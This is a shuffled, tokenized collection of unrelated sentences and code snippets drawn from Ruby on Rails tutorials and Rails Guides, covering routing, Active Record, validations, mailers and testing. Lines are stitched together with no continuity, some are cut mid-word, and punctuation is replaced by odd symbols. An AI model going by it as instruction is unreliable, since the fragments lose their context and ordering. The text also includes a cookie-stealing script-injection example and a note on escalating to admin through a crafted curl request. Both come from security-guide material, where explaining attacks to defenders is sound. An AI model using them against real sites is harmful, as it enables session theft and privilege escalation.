Note how similar the final step is to logging a user in , where we retrieve the user by email address and then verify ( using the \ kode { authenticate } method ) that the submitted password matches the password digest ( Listing ~ \ ref { code : find _ authenticate _ user } ) .
This test does the same thing as the first duplicate email test , but with an upper-case email address instead .
This is due to the setup of the testing ╼ environment ; an engine needs an application as a host for testing its main ╼ functionality , especially controllers ▖
As with the other features of our sample app , we &apos;ll add User model validations using test-driven development .
# # # `strip _ heredoc`
person ▖ errors ▖ size # = &gt; 2
Opening a new terminal tab .
When making views , we &apos;ll focus on the visual appearance and not worry too much about the exact structure of the page , which means that ( at least for now ) we won &apos;t be writing tests .
If you choose not to make them gems , you can move them into , say , `lib / my _ plugin / * ` and add an appropriate initializer in `config / initializers / my _ plugin ▖ rb` .
We can also verify that the \ kode { authenticate } command is working by first using an invalid password and then a valid one :
Time ▖ local ( 2000 , 10 , 31 ) ▖ prev _ quarter # = &gt; Mon , 30 Oct 2000
REpresentational State Transfer ( REST )
has _ many : orders , - &gt; { order &quot; date _ confirmed DESC &quot; }
Looking at the Bootstrap variable page , we see that there is a variable for light gray :
The \ kode { current \ _ user ? }
Rails does have some good reasons ; for example , in web applications we often want to prevent variables from being \ emph { blank } ---e ▖ g ▖ , a user &apos;s name should be something other than spaces and other \ href { http : / / en ▖ wikipedia ▖ org / wiki / Whitespace _ ( computer _ science ) } { whitespace } ---so Rails adds a \ kode { blank ? } \ method to Ruby .
Client ▖ where ( first _ name : &apos; does not exist &apos; ) ▖ take !
Testing Relationship creation and attributes .
Rails comes with a number of scripts called generators that are designed to make ╼ your development life easier by creating everything that &apos;s necessary to start ╼ working on a particular task ▖
If possible , use UTF-8 as the internal storage of your database .
PUT / articles / : id ( ▖ : format ) articles # update
Date ▖ new ( 2000 , 5 , 31 ) ▖ next _ month # = &gt; Fri , 30 Jun 2000
&gt; &gt; p = Person ▖ create
# # # # Collection Partial Layouts
It appeared on June 11 , 2006 and was the first webmail interface worm :
* `action _ controller ▖ initialize _ framework _ caches` Sets `ActionController : : Base ▖ cache _ store` - if it &apos;s not already set - to `Rails ▖ cache` .
* `config ▖ action _ view ▖ field _ error _ proc` provides an HTML generator for displaying errors that come from Active Record ▖
As in Section ~ \ ref { sec : user _ validations } , the code in Listing ~ \ ref { code : micropost _ validations _ tests } uses string multiplication to test the micropost length validation :
The result appears in Listing ~ \ ref { code : user _ model _ activation _ code }
This third edition of the \ emph { Ruby on Rails Tutorial } aims to lower the barrier to getting started with Rails in a number of ways :
This will make it much simpler to remove all the repetition at a stroke .
The first case applies to both the \ kode { edit } and \ kode { update } actions , and so logically belongs in a before filter ( Listing ~ \ ref { code : password _ reset _ update _ action } ) .
render action : &quot; regular _ show &quot;
A configuration file for \ href { http : / / rack ▖ rubyforge ▖ org / doc / } { Rack middleware }
TIP : The ` : foreign _ key` and ` : association _ foreign _ key` options are useful when setting up a many-to-many self-join ▖
For options , please see the parent section , &#91; Calculations &#93; ( # calculations ) .
As a Rails application developer , the RESTful style of development helps you make choices about which controllers and actions to write : you simply structure the application using resources that get created , read , updated , and deleted .
That video and its successors are a great way to get a taste of Rails &apos; power , and I recommend watching them .
sting } ╼ ╼ \ subsection { Image upload in production } % ( fold ) ╼ \ label { sec : image _ upload _ in _ production } ╼ ╼
&quot; M : : X &quot; ▖ constantize # = &gt; 1
As in previous chapters , we &apos;ll do our work on a topic branch and merge in the changes at the end :
This code is highly preferable :
NOTE : `ActionDispatch : : MiddlewareStack` is Rails equivalent of `Rack : : Builder` , but built for better flexibility and more features to meet Rails &apos; requirements .
&lt; % @ article ▖ errors ▖ full _ messages ▖ each do &#124; msg &#124; % &gt;
NOTE : Defined in `active _ support / core _ ext / hash / compact ▖ rb` .
date _ field ( &quot; user &quot; , &quot; dob &quot; )
end
Thanks for joining and have a great day !
@ x , @ y = x , y
&#124; public / &#124; The only folder seen by the world as-is ▖
Before the interceptor can do its job you need to register it with the Action ╼ Mailer framework ▖
&quot; invoice _ lines &quot; ▖ classify # = &gt; &quot; InvoiceLine &quot;
( Since systems will vary , and since keeping track of how many tests there are at each stage of the tutorial is a maintenance nightmare , I &apos;ll omit the RSpec output from now on ▖ )
# # # # Using Index Files
The Home page ( \ href { http : / / localhost : 3000 / } { / } ) with a new micropost form ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / home _ with _ form _ bootstrap-full ▖ png } { ( full size ) }
With the completion of the Microposts resource , now is a good time to push the repository up to GitHub :
It has a ` : remote` option that you can use like ╼ this :
Like with any blog , our readers will create their comments directly after ╼ reading the article , and once they have added their comment , will be sent back ╼ to the article show page to see their comment now listed ▖
resources : photos , : accounts
# = &gt; { &quot; &quot; = &gt; nil , &quot; A &quot; = &gt; : a , &quot; 1 &quot; = &gt; 1 }
NOTE : Use `photos _ path` , `new _ photo _ path` , etc ▖ to generate paths for this resource .
&lt; % = link _ to &apos; Edit Ad &apos; , &#91; : edit , @ magazine , @ ad &#93; % &gt;
In particular , if you are unfamiliar with \ emph { classes } ( discussed in Section ~ \ ref { sec : ruby _ classes } ) , I suggest looping back to this section at a later time .
+ ---- + ------------- + ---------- + ------ + --------------- +
If you want to remove session related middleware , do the following :
by itself .
If you learn &quot; The Rails Way &quot; you &apos;ll probably discover a ╼ tremendous increase in productivity ▖
# = &gt; &lt; input type = &quot; url &quot; id = &quot; user _ url &quot; name = &quot; user &#91; url &#93; &quot; value = &quot; # { @ user ▖ url } &quot; / &gt;
12345678 ▖ to _ s ( : delimited , delimiter : &quot; ▖ &quot; )
&quot; name &quot; ▖ dasherize # = &gt; &quot; name &quot;
All this talk about classes and inheritance may have triggered a flash of recognition , because we have seen both before , in the Static Pages controller ( Listing ~ \ ref { code : adding _ the _ about _ page } ) :
&quot; Tom &amp; Jerry &quot; ▖ to _ param # = &gt; &quot; Tom &amp; Jerry &quot;
# Ruby on Rails Tutorial : first application
Rails supports multiple template systems and uses a file extension to distinguish amongst them ▖
By default the root node is &quot; hash &quot; , but that &apos;s configurable via the ` : root` option .
Note that the final step is necessary to write the changes to the database .
Elimination of many external dependencies ( RSpec , Cucumber , Capybara , Factory Girl )
To follow a user , we post to the relationships path and verify that the number of followed users increases by ~ 1 :
And the groups that have them are always the last ones .
In earlier versions , a `HashWithIndifferentAccess` was used ▖
A form for unfollowing a user .
Default is false .
Although we don &apos;t yet know how to implement it , we can already write tests for its functionality .
As a capstone to our work on the layout and routing , in this section we &apos;ll make a route for the signup page , which will mean creating a second controller along the way .
The ╼ following pointers may be helpful :
The way to set such an attribute to \ kode { true } is to pass the value \ kode { admin = &apos; 1&apos; } as part of \ kode { params &#91; : user &#93; } , a task that is easy to accomplish using a command-line HTTP client such as \ texttt { curl } .
# # # # Scopes for `belongs _ to`
&lt; small &gt; By &lt; % = article ▖ author % &gt; &lt; / small &gt;
Calling `content _ for` stores a block of markup in an identifier for later use ▖
We &apos;ll then create our first Rails application , called ( appropriately enough ) \ kode { first \ _ app } .
Now it ╼ is merged like any other scope .
SELECT * FROM clients LIMIT 5 OFFSET 30
* `update _ attribute`
The view for the Home page with an Embedded Ruby title .
&gt; &gt; Rails ▖ env ▖ development ?
The resulting backtrace is often inconveniently long , especially since the source of the problem is usually the application and not one of its dependencies .
config ▖ action _ mailer ▖ perform _ deliveries = true
* `config ▖ colorize _ logging` specifies whether or not to use ANSI color codes when logging information ▖
We saw in Section ~ \ ref { sec : database _ migrations } that generating the User model automatically created a new migration ( Listing ~ \ ref { code : users _ migration } ) ; in the present case , we are adding structure to an existing model , so we need to create a migration directly using the \ kode { migration } generator :
Here &apos;s the revised code for setting up customers and orders :
This requires a \ kode { before \ _ create } callback , which we &apos;ll define as follows :
If you require this sort of complex behavior on the table that joins two models in a many-to-many relationship , you should use a `has _ many : through` association instead of `has _ and _ belongs _ to _ many` .
module X
&#91; Steve Souders recommends &#93; ( http : / / www ▖ stevesouders ▖ com / blog / 2008 / 08 / 23 / revving-filenames-dont-use-querystring / ) , ╼ &quot; ▖ ▖ ▖ avoiding a querystring for cacheable resources &quot; ▖
The new article form &#93; ( images / getting _ started / new _ article ▖ png )
In order to see these changes , our test needs to log in as a previously registered user , which means that such a user must already exist in the database .
Showing the users the given user is following .
as shown in Listing ~ \ ref { code : following _ followers _ authorization _ test } .
&quot; hello &quot; ▖ to ( 2 ) # = &gt; &quot; hel &quot;
foo @ bar _ baz ▖ com foo @ bar + baz ▖ com &#93;
For example , if you &apos;re getting a set of records and want to order them in ascending order by the `created _ at` field in your table :
* ` : destroy` causes the associated object to also be destroyed
* Otherwise , a node with `key` as tag is created with a string representation of `value` as text node ▖
Only the gem &apos;s admin layout needs ╼ these assets ▖
t ▖ string : name
Just like with controller views , use `yield` to render the view inside the ╼ layout .
Defining the \ kode { current \ _ user } helper as discussed above leads to the implementation shown in Listing ~ \ ref { code : persistent _ current _ user } .
\ href { http : / / guides ▖ rubyonrails ▖ org / } { Rails Guides } : Topical and up-to-date Rails references
The configuration file for the production webserver .
* `action _ mailer ▖ logger` Sets `ActionMailer : : Base ▖ logger` - if it &apos;s not already set - to `Rails ▖ logger` .
* `ActiveRecord : : QueryCache` caches all SELECT queries generated in a request ▖
Associations are extremely useful , but they are not magic ▖
Because the ``Log out &apos; &apos; link has already been defined ( Listing ~ \ ref { code : layout _ login _ logout _ links } ) , all we need is to write a valid controller action to destroy user sessions .
While you &apos;re waiting for feedback on your pull request , open up a few other ╼ pull requests and give someone else some !
{ a : 1 , b : 2 , c : nil } ▖ compact # = &gt; { a : 1 , b : 2 }
Guide Assumptions
# validates : name , presence : true
&lt; % = stylesheet _ link _ tag &quot; layout &quot; % &gt;
* `config ▖ session _ store` is usually set up in `config / initializers / session _ store ▖ rb` and specifies what class to use to store the session ▖
* Bi-directional associations
The generation of the reader instance method can be prevented by setting ` : instance _ reader` to `false` and the generation of the writer instance method can be prevented by setting ` : instance _ writer` to `false` ▖
Upgrading from Rails 3 ▖ 0 to Rails 3 ▖ 1
Returns a select tag with options for each of the seconds 0 through 59 with the current second selected .
* ` : source`
You can learn more about callbacks in ╼ the &#91; Active Record Callbacks guide &#93; ( active _ record _ callbacks ▖ html ) .
I &apos;m learning Ruby on Rails with @ railstutorial !
The RESTful structure of Rails applications is best absorbed by this sort of repetition of form ; indeed , seeing the parallel structure of Users and Microposts even at this early stage is one of the prime motivations for this chapter .
Because of this behavior you cannot use any of the ` * _ path` helpers inside of ╼ an email ▖
Oh dea ▖ ▖ ▖ &quot;
The `comment _ counter` local variable is given to us by the ` &lt; % = render ╼ @ article ▖ comments % &gt; ` call , which will define it automatically and increment the ╼ counter as it iterates through each comment ▖
* `geocoder _ path` returns ` / geocoder`
password : &apos; &lt; password &gt; &apos; ,
12345 ▖ to _ s ( : human ) # = &gt; &quot; 12 ▖ 3 Thousand &quot;
The result appears in Listing ~ \ ref { code : successful _ edit _ test }
$ bundle exec rake test TEST = test / integration / users _ login _ test ▖ rb
1234567890123 ▖ to _ s ( : human ) # = &gt; &quot; 1 ▖ 23 Trillion &quot;
NOTE : Defined in `active _ support / core _ ext / module / attr _ internal ▖ rb` .
get &apos; photos / : id &apos; , to : &apos; photos # show &apos; , defaults : { format : &apos; jpg &apos; }
# # # # `in _ groups _ of ( number , fill _ with = nil ) `
Adding the URL to the users link .
We then make 50 microposts for each user ( plenty to overflow the pagination limit of ~ 30 ) , generating sample content for each micropost using the Faker gem &apos;s handy \ href { http : / / faker ▖ rubyforge ▖ org / rdoc / classes / Faker / Lorem ▖ html } { \ texttt { Lorem ▖ sentence } method } .
This means there is no way \ href { http : / / en ▖ wikipedia ▖ org / wiki / Hypertext _ Transfer _ Protocol # HTTP _ session _ state } { within the hypertext transfer protocol } to remember a user &apos;s identity from page to page ; instead , web applications requiring user login must use a \ href { http : / / en ▖ wikipedia ▖ org / wiki / Session _ ( computer _ science ) } { \ emph { session } } , which is a semi-permanent connection between two computers ( such as a client computer running a web browser and a server running Rails ) .
$ bundle exec rake test
The results are shown in Figure ~ \ ref { fig : demo _ micropost _ model } .
This makes it easier to backport changes to stable ╼ branches , squashing makes it easier to revert bad commits , and the git history ╼ can be a bit easier to follow ▖
For example , to test unsuccessful signin , we could write the following scenario :
When you type `http : / / localhost : 3000` into your browser &apos;s address bar and hit ╼ &apos; Go , &apos; the browser ( your &apos; client &apos; ) makes a request to the server ▖
in Listing ~ \ ref { code : feed _ item _ partial } .
def welcome _ email ( user )
Listing ~ \ ref { code : user _ login _ test _ valid _ information } also verifies that the login link disappears by verifying that there are \ emph { zero } login path links on the page :
The method `pluralize` returns the plural of its receiver :
A mockup of the result of visiting a protected page ~ \ href { http : / / railstutorial ▖ org / images / figures / signin _ page _ protected _ mockup _ bootstrap-full ▖ png } { ( full size ) }
class Computer &lt; ActiveRecord : : Base
resources : accounts
duplicate ▖ push &apos; another-string&apos;
Consider the following simple Active Record class :
Receiving and parsing emails with Action Mailer can be a rather complex ╼ endeavor ▖
scope &apos; admin &apos; , as : &apos; admin &apos; do
You can specify certain conditions to be removed using the `unscope` method ▖
config ▖ assets ▖ version = &apos; 1 ▖ 0&apos;
We can test this with the \ kode { it } and \ kode { its } methods as follows :
= &gt; Word
But a craftsman has to know his tools , and in the end the reward is worth the effort .
The simplified user \ kode { index } action for the demo application .
1235551234 ▖ to _ s ( : phone )
We &apos;ll follow the examples from Listing ~ \ ref { code : static _ page _ routes } and add a \ kode { get &apos; / signup &apos; } rule for the signup URL , as shown in Listing ~ \ ref { code : signup _ route } .
However , public API follows a slightly different convention ▖
# # # # Rendering Text
You can also use an argument to the \ kode { heroku } command that automatically opens your browser with the right address :
If you open ╼ `app / controllers / articles _ controller ▖ rb` again , you &apos;ll notice that we don &apos;t ╼ check the result of calling ` @ article ▖ save` inside the `create` action ▖ ╼
It is broken in small pieces so that you can load just what you need , and also has some convenience entry points to load related extensions in one shot , even everything .
the output includes the following complaint :
A test for validation of the \ kode { name } attribute ▖
Now that we &apos;ve completed a quick overview of the Users resource , let &apos;s examine one particular part of it in the context of the Model-View-Controller ( MVC ) pattern introduced in Section ~ \ ref { sec : mvc } .
The inheritance hierarchy for the User and Micropost models .
Support for the `encode _ json` hook
In principle , these two tasks can be combined in \ kode { rake db : reset } , but as of this writing this command doesn &apos;t work with the latest version of Rails .
@ article = Article ▖ new
The tests for the \ kode { update } action are similar to those for \ kode { create } .
Because they make common operations simpler and easier in your code ▖
te } ╼ ╼ \ subsection { Heroku commands } ╼ \ label { sec : heroku _ commands } ╼ ╼
only \ emph { one } of the lines gets executed ( based on the nature of the request ) .
Note the use of \ kode { if @ user ▖ microposts ▖ any ? } \ ( a construction we saw before in Listing ~ \ ref { code : errors _ partial } ) , which makes sure that an empty list won &apos;t be displayed when the user has no microposts .
Rails will automatically render `app / views / books / index ▖ html ▖ erb` when you navigate to ` / books` and you will see &quot; Books are coming soon ! &quot; on your screen .
match end of a string
The results of Listing ~ \ ref { code : custom _ home _ page } and Listing ~ \ ref { code : custom _ help _ page } are shown in Figure ~ \ ref { fig : custom _ home _ page } and Figure ~ \ ref { fig : custom _ help _ page } .
Looping through the flash ╼ will always yield string keys :
render &apos; edit&apos;
Section ~ \ ref { sec : activation _ email _ in _ production } discusses how to send email for real in a production environment .
&gt; &gt; p ▖ valid ?
javascript _ url &quot; common &quot; # = &gt; http : / / www ▖ example ▖ com / assets / common ▖ js
# &lt; id type = &quot; integer &quot; &gt; 4404 &lt; / id &gt;
If you want to serve only some assets from your CDN , you can use custom ` : host` ╼ option your asset helper , which overwrites value set in ╼ `config ▖ action _ controller ▖ asset _ host` .
def prepare
t ▖ string : order _ number
( I find it confusing that the console , server , and migrate commands specify non-default environments in three mutually incompatible ways , which is why I bothered showing all three ▖ )
These dots represent omitted code and should not be copied literally .
( The indentation is optional---HTML is not sensitive to whitespace , and ignores both tabs and spaces---but it makes the document &apos;s structure easier to see ▖ )
For more details on the kind of callbacks supported by Active Record , see the \ href { http : / / guides ▖ rubyonrails ▖ org / active _ record _ callbacks ▖ html } { discussion of callbacks at the Rails Guides } .
&lt; % = image _ tag &quot; icons / delete ▖ gif &quot; % &gt;
We can visualize the result of this association in Figure ~ \ ref { fig : micropost _ user _ association } .
mod ▖ const _ set ( const _ name , value )
N = Module ▖ new
Creating a new workspace at Cloud9 .
Through these examples , you will see how Rails can handle even rather intricate data models , which should serve you well as you go on to develop your own applications with their own specific requirements .
record ▖ errors &#91; : name &#93; &lt; &lt; &apos; Need a name starting with X please ! &apos;
Basic HTTP Authentication Challenge &#93; ( images / getting _ started / challenge ▖ png )
By assigning a message to the \ kode { flash } , we are now in a position to display the message on the first page after the redirect .
# # # `try`
&quot; visualEffect &quot; ▖ underscore # = &gt; &quot; visual _ effect &quot;
says that we are missing a ``template &apos; &apos; , i ▖ e ▖ , a view :
t ▖ belongs _ to : customer
Please remember to use it for commits containing only documentation changes .
# # # Warnings
&lt; script &gt; document ▖ write ( document ▖ cookie ) ; &lt; / script &gt;
( We &apos;ll create the \ kode { shared } directory starting in Chapter ~ \ ref { cha : sign _ up } ▖ )
Now the tests should be \ passing :
&#124; `LineItem` &#124; `line _ items` &#124;
Git is a large subject , and we &apos;ll only be scratching the surface in this book , but there are many good free resources online ; I especially recommend \ href { http : / / git-scm ▖ com / book } { \ emph { Pro Git } } by Scott Chacon ( Apress , 2009 ) .
in Listing ~ \ ref { code : layout _ links _ test _ signup _ full _ title _ helper } .
We can use the above method to construct the necessary array of followed user ids by calling ~ \ kode { id } on each element in \ kode { user ▖ following } .
This means that if you have an asset called `style ▖ css` , it should be placed at ╼ `app / assets / stylesheets / &#91; engine name &#93; / style ▖ css` , rather than ╼ `app / assets / stylesheets / style ▖ css` ▖
Additionally , all the HTML in this section should render properly , showing the form as in Figure ~ \ ref { fig : home _ with _ form } , and a form with a submission error as in Figure ~ \ ref { fig : home _ form _ errors } .
The Home page with an added footer .
If you didn &apos;t do that exercise , update your Users helper file with the contents of Listing ~ \ ref { code : gravatar _ option } before proceeding .
In ╼ anticipation of this change , Rails 4 ▖ 2 introduced a new configuration option ╼ `active _ support ▖ test _ order` for explicitly specifying the test ordering ▖
One way to use partials is to treat them as the equivalent of subroutines : as a way to move details out of a view so that you can grasp what &apos;s going on more easily ▖
# Returns the current logged-in user ( if any ) .
The following is a technical explanation of the worm .
Setting the test domain host .
&lt; % = link _ to &apos; Ad details &apos; , &#91; @ magazine , @ ad &#93; % &gt;
It can also generate paths and URLs , avoiding the need to hardcode strings in your views .
If you frequently retrieve line items directly from customers ( ` @ customer ▖ orders ▖ line _ items` ) , then you can make your code somewhat more efficient by including line items in the association from customers to orders :
The resulting correspondence of URLs , actions , and named routes is shown in Table ~ \ ref { table : RESTful _ users } .
unless @ number ▖ nil ?
\ kode { app / assets } : assets specific to the present application
Because of the innumerable small differences between different computer systems , the output you see may not always agree exactly with what is shown in the text , ╼ but this is not cause for concern .
@ book = Book ▖ find _ by ( id : params &#91; : id &#93; )
Upgrading from Rails 4 ▖ 1 to Rails 4 ▖ 2
Getting Started with Engines
app / assets / stylesheets /
Tests for valid email formats ▖
clients = Client ▖ includes ( : address ) ▖ limit ( 10 )
# # # # `find`
* What extensions Active Support provides .
Here the regex \ kode { VALID \ _ EMAIL \ _ REGEX } is a \ emph { constant } , indicated in Ruby by a name starting with a capital letter .
The \ emph { Rails Tutorial } emphasizes good software development practices , so immediately after creating our fresh new Rails project we &apos;ll put it under version control with Git ( Section ~ \ ref { sec : version _ control } ) .
x + = 1
In Hinduism , an avatar is the manifestation of a deity in human or animal form .
The `collection &lt; &lt; ` method adds one or more objects to the collection by creating records in the join table .
with a \ kode { nil } remember digest , thereby raising an exception inside the bcrypt library .
in Listing ~ \ ref { code : user _ create _ action } .
New tests are best contributed in the form of a patch , as explained later on in the &quot; Contributing to the Rails Code &quot; section .
in Listing ~ \ ref { code : micropost _ model _ image } .
Now that we have a working User model , it &apos;s time to add an ability few websites can live without : letting users sign up .
Since users can &apos;t yet sign up for the sample application through the web---that &apos;s the goal of Chapter ~ \ ref { cha : sign _ up } ---we &apos;ll use the Rails console to create a new user by hand .
customer ▖ orders # retrieves orders from the database
This creates ``getter &apos; &apos; and ``setter &apos; &apos; methods that allow us to retrieve ( get ) and assign ( set ) \ kode { @ name } and \ kode { @ email } \ emph { instance variables } , which were mentioned briefly in Section ~ \ ref { sec : mvc _ in _ action } and Section ~ \ ref { sec : static _ pages _ exercises } .
If you already draw such routes , you must change them , for example :
&#124; test / &#124; Unit tests , fixtures , and other test apparatus ▖
Unlike the Users resource , which used the special \ kode { resources } method to obtain a full suite of RESTful routes automatically ( Listing ~ \ ref { code : users _ resource } ) , the Sessions resource will use only named routes , handling \ texttt { GET } and \ texttt { POST } requests with the \ kode { login } route and \ texttt { DELETE } request with the \ kode { logout } route .
&lt; td &gt; &lt; % = link _ to &quot; Remove &quot; , book , method : : delete , data : { confirm : &quot; Are you sure ? &quot;
and then using a variant of the \ kode { it } method to collapse the code and description into one line :
These parameters can then be referenced inside the controller ╼ actions , typically to perform a particular task ▖
&lt; / ol &gt;
( It &apos;s supported by PostgreSQL , which we use in production , but not by the development SQLite database adapter ▖ )
╼ boolean ? ?
&#124; GET &#124; / kategorien / neu &#124; categories # new &#124; new _ category _ path &#124;
* `config ▖ action _ mailer ▖ logger` accepts a logger conforming to the interface of Log4r or the default Ruby Logger class , which is then used to log information from Action Mailer ▖
* `Rack : : Lock` wraps the app in mutex so it can only be called by a single thread at a time ▖
@ orders = @ customer ▖ orders
The ╼ default behavior for all the built-in validation helpers is to be run on save ╼ ( both when you &apos;re creating a new record and when you &apos;re updating it ) ▖
as shown in Listing ~ \ ref { code : user _ reverse _ relationships } .
The commands in Listing ~ \ ref { code : bitbucket _ add _ push } first tell Git that you want to add Bitbucket as the \ emph { origin } for your repository , and then push your repository up to the remote origin .
We &apos;ll prevent the second problem by storing a hash digest of the remember token instead of the token itself , in much the same way that we stored password digests instead of raw passwords in Section ~ \ ref { sec : adding _ a _ secure _ password } .
* They do not work with ` : as` associations .
* `add _ builtin _ route` If the application is running under the development environment then this will append the route for `rails / info / properties` to the application routes ▖
The authentication system we develop in this chapter will allow us to customize the site and implement an authorization model based on login status and identity of the current user .
An emphasis on HTTP verbs is typical of web frameworks ( including Rails ) influenced by the \ emph { REST architecture } , which we saw briefly in Chapter ~ \ ref { cha : a _ toy _ app } and will start learning about more in Chapter ~ \ ref { cha : sign _ up } .
Adding \ kode { store \ _ location } to the signed-in user before filter .
If you need to use a dot within an ` : id` add a constraint which overrides this - for example `id : / &#91; ^ \ / &#93; + / ` allows anything except a slash .
To generate this new column , run this command within the engine :
# = &gt; true
With the user view and action defined , the URL \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } works perfectly , as seen in Figure ~ \ ref { fig : user _ show _ rails } .
TIP : Since `with _ options` forwards calls to its receiver they can be nested ▖
i = Item ▖ lock ( &quot; LOCK IN SHARE MODE &quot; ) ▖ find ( 1 )
The ` : locale` key in this hash ╼ simply indicates what spoken language template should be retrieved ▖
# # # `sum`
Now all these assertions raise `Assertion` instead of `ActionController : : RoutingError` .
WARNING : The use of extra attributes on the join table in a `has _ and _ belongs _ to _ many` association is deprecated ▖
It accepts a list of column names as argument and returns an array of values of the specified columns with the corresponding data type .
In addition , any object being replaced is also automatically saved , because its foreign key will change too .
By doing this you &apos;ll also have the ability to map the columns of each ╼ row in that table with the attributes of the instances of your model ▖
t ▖ string : part _ number
options &#91; : counter _ cache &#93;
When to test
&#124; `perform _ deliveries` &#124; Determines whether deliveries are actually carried out when the `deliver` method is invoked on the Mail message ▖
The asset pipeline requires the following additions :
= = CreateArticles : migrating = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
# If you want to send the email through Active Job use # deliver _ later
&#91; RedCloth &#93; ( http : / / redcloth ▖ org / ) is such a language for Ruby , but without precautions , it is also vulnerable to XSS .
Getting started with Bitbucket is simple :
The \ kode { rails } script generates a new controller with \ kode { rails generate controller ControllerName &lt; optional action names &gt; } .
Our security model requires that ordinary users not see delete links :
Setting `config ▖ assets ▖ logger` to false will turn off served assets logging .
As the `render` ╼ method iterates over the ` @ article ▖ comments` collection , it assigns each ╼ comment to a local variable named the same as the partial , in this case ╼ `comment` which is then available in the partial for us to show .
It &apos;s useful to be able to open the entire Rails project in your text editor or IDE ▖ Unfortunately , how to do this is system-dependent , but in many cases you can open the current application directory , represented in Unix by a dot ~ `` \ kode { ▖ } &apos; &apos; , using the command-line command for your editor of choice :
app ▖ config ▖ assets ▖ precompile + = % w ( admin ▖ css admin ▖ js )
Anything other than ` : controller` or ` : action` will be available to the action as part of `params` ▖
Rails offers facilities for inspecting and testing your routes .
Now you can add articles and comments to your blog and have them show up in the ╼ right places .
Defaults to `config / locales / * ▖ { yml , rb } ` .
The result is a Micropost model with the structure shown in Figure ~ \ ref { fig : micropost _ model } .
Incredibly , it is---but it &apos;s absurd .
If you like , at this point you can even deploy the updated application to Heroku :
As you can see , you can generate mailers just like you use other generators with ╼ Rails ▖
&lt; body &gt;
in Listing ~ \ ref { code : edit _ tests _ signed _ in } .
@ article = Article ▖ find ( params &#91; : article _ id &#93; )
Open up the ╼ `config / routes ▖ rb` file again , and edit it as follows :
render &quot; books / edit ▖ html ▖ erb &quot;
Once you &apos;ve created a model and added validations , if that model is created via ╼ a web form , you probably want to display an error message when one of the ╼ validations fail .
# # # The `has _ many` Association
Now run the migration to create our blorgh _ comments ╼ table :
Opening the project
Our first task is to test for a failing signup form , and we can simulate the submission of invalid data by visiting the page and clicking the button using \ kode { click \ _ button } :
* * `Rack : : MethodOverride` * *
The Micropost data model with a \ kode { picture } attribute .
Now that we &apos;ve created the actions and views for some static pages , we &apos;ll make them \ emph { very slightly } dynamic by adding some content that changes on a per-page basis : we &apos;ll have the title of each page change to reflect its content .
Add the following line to `Capfile` :
Signup failure .
7 ▖ ▖ 11 ) # = &gt; true
For example , we instantiated a string using the double quote characters , which is a \ emph { literal constructor } for strings :
as shown in Listing ~ \ ref { code : signed _ in _ user _ index } .
For example , to link to a JavaScript file that is inside a directory called `javascripts` inside of one of `app / assets` , `lib / assets` or `vendor / assets` , you would do this :
Modify the \ kode { destroy } action to prevent admin users from destroying themselves .
To define the \ kode { update } action corresponding to the \ kode { edit } action in Listing ~ \ ref { code : password _ reset _ edit _ action } , we need to consider four cases : an expired password reset , a successful update , a failed update ( due to an invalid password ) , and a failed update ( which initially looks ``successful &apos; &apos; ) due to a blank password and confirmation .
Mailer test cases obtain the mailer being tested from the name of the test class using `constantize` :
In `application ▖ rb` :
╼ end
The method `titleize` capitalizes the words in the receiver :
associates the \ kode { center } class with the \ kode { text-align : center } property .
assemblies ▖ where ( ▖ ▖ ▖ )
Here &apos;s what &apos;s going on : every Rails model can be initialized with its ╼ respective attributes , which are automatically mapped to the respective ╼ database columns ▖
# this block is called only when running console ,
As with model inheritance , both the Users and Microposts controllers gain a large amount of functionality by inheriting from a base class ( in this case , \ kode { ActionController : : Base } ) , including the ability to manipulate model objects , filter inbound HTTP requests , and render views as HTML ▖ Since all Rails controllers inherit from \ kode { ApplicationController } , rules defined in the Application controller automatically apply to every action in the application .
For the last of these , note the use of
# # # # `at ( position ) `
class Application &lt; Rails : : Application
The profile of a different user , also with microposts ( \ href { http : / / localhost : 3000 / users / 5 } { / users / 5 } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / other _ profile _ with _ microposts _ bootstrap-full ▖ png } { ( full size ) }
In addition to documenting the bug and preventing a regression , this will also give us a good foundation for further integration tests of login and logout .
Note that the above code is database-agnostic : it will run in MySQL , ╼ PostgreSQL , Oracle and others ▖
Adding some spacing and other universal styling ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / sample _ app _ universal _ 4 _ 0-full ▖ png } { ( full size ) }
Moreover , since the structure is common to all Rails apps , you can immediately get your bearings when looking at someone else &apos;s code .
With the code in this section , our Micropost model and interface are complete , and the test suite should pass :
This will generate routes such as `admin _ photos _ path` and `admin _ accounts _ path` which map to ` / admin / photos` and ` / admin / accounts` respectively .
For example , say that you &apos;ve created an admin functionality ╼ that only exists for your engine ▖
Client ▖ pluck ( : id , : name )
During the precompilation phase an MD5 is generated from the contents of the ╼ compiled files , and inserted into the filenames as they are written to disc ▖ ╼
A mockup of the signup failure page .
With all the work making templates for user microposts in Section ~ \ ref { sec : rendering _ microposts } , the ending was rather anticlimactic .
NOTE : Defined in `active _ support / core _ ext / module / remove _ method ▖ rb`
and similarly for \ kode { update } .
In Section ~ \ ref { sec : a _ user _ class } , we designed the example User class to take an \ emph { initialization hash } to set the object attributes ; that design choice was motivated by Active Record , which allows objects to be initialized in the same way :
Rails provides a simple configuration interface `config ▖ middleware` for adding , removing and modifying the middlewares in the middleware stack via `application ▖ rb` or the environment specific configuration file `environments / &lt; environment &gt; ▖ rb` .
To exit Guard , press Ctrl-D ▖ To add additional matchers to Guard , refer to the examples in Listing ~ \ ref { code : guardfile } , the \ href { https : / / github ▖ com / guard / guard } { Guard README } , and the \ href { https : / / github ▖ com / guard / guard / wiki } { Guard wiki } .
validates : title , presence : true ,
when &apos; Reviewer&apos;
# = &gt; ActiveRecord : : RecordInvalid : Validation failed : Orders count can &apos;t be blank
For example , to select only `viewable _ by` and `locked` columns :
which is
Thanks to running \ kode { rails new } in Section ~ \ ref { sec : the _ hello _ application } and \ kode { bundle install } in Section ~ \ ref { sec : bundler } , we already have an application we can run---but how ?
This code uses the \ kode { : member } method inside a \ kode { resources } \ emph { block } , which we haven &apos;t seen before , but see if you can guess what it does .
The prefix is still set to ╼ ` / assets` in the production environment ▖
Even at this early stage , it &apos;s helpful to get a high-level overview of how Rails applications work ( Figure ~ \ ref { fig : MVC } ) .
belongs _ to : document
create test / controllers / microposts _ controller _ test ▖ rb
